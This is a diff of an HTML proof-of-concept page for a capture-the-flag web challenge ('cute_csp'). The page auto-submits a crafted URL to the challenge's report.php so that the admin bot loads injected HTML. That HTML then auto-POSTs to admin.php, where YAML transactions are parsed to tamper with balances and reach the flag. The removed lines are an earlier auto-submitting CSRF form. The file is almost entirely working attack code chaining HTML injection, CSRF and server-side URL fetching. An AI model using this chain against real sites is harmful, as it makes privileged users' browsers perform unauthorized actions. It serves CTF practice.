@@ -1,14 +1,36 @@
 <!doctype html>
 <html>
-  <body>
-    <!--
-      This page auto-submits to admin.php on the localhost server.
-      The hidden input 'url' points back to admin.php with transactions
-      encoded as GET params so admin.php in GET mode will emit YAML.
-    -->
-    <form id="f" action="http://localhost:5000/admin.php" method="POST">
-      <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions>[0][amount]=1&transactions[0][country]=FLAG&transactions[0][op]=BUY&transactions[1][amount]=1&transactions[1][country]=FLAG&transactions[1][op]=SELL">
-    </form>
-    <script>document.getElementById('f').submit();</script>
-  </body>
+<head>
+  <meta charset="utf-8">
+  <title>cute_csp PoC</title>
+</head>
+<body>
+  <!-- auto-submit to the challenge's report.php with a crafted index.php payload -->
+  <form id="r" action="http://dgfsagewmjq-0.playat.flagyard.com/report.php" method="GET">
+    <input type="hidden" name="url" id="url">
+  </form>
+
+  <script>
+    // YAML that will ultimately be parsed by admin.php (via yaml_parse_url)
+    const yaml = '- {op: BUY, amount: 1000000, currency: "ZZ"}\n'
+               + '- {op: SELL, amount: 1000000, currency: "ZZ"}\n'
+               + '- {op: BUY, amount: 1, currency: "FL"}';
+
+    // attack HTML: when the bot visits index.php?html=<attack_html> it will execute this form
+    // which posts to admin.php with url=http://localhost:5000/index.php?html=<yaml>
+    const attackHtml = '<form id="f" action="http://localhost:5000/admin.php" method="POST">'
+                     + '<input type="hidden" name="url" value="http://localhost:5000/index.php?html='
+                     + encodeURIComponent(yaml)
+                     + '">'
+                     + '</form>'
+                     + '<script>document.getElementById("f").submit();</' + 'script>';
+
+    // outer URL: instruct the bot to visit index.php with our attack HTML as the "html" GET param
+    const outerUrl = 'http://localhost:5000/index.php?html=' + encodeURIComponent(attackHtml);
+
+    // set the report.php url parameter and submit
+    document.getElementById('url').value = outerUrl;
+    document.getElementById('r').submit();
+  </script>
+</body>
 </html>
